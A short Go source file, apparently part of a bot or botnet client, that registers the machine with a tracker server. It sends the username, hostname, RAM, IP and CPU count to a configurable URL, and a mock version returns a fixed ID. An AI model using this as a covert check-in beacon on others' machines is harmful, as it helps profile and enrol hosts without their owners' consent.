package bot

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
)

type Tracker interface {
	add(b *Bot) (string, error)
}

type MockTracker struct {
}

func (MockTracker) add(b *Bot) (string, error) {
	log.Println("#Tracker: Received Ping")
	return "uuid-cafebabe", nil
}

type TrackerProxy struct {
	Url string
}

func (proxy TrackerProxy) add(b *Bot) (string, error) {
	url := fmt.Sprintf("%s/bot", proxy.Url)
	jsonstr := fmt.Sprintf(`{"username": "%s", "hostname": "%s", "ram": %d, "ip": "%s", "ncpu": %d}`,
		b.system.GetUserName(), b.system.GetHostName(), b.system.GetRam(), b.system.GetIp(), b.system.GetNcpu())
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(jsonstr))
	if err != nil {
		log.Println(err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
		return "", err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body), nil
}
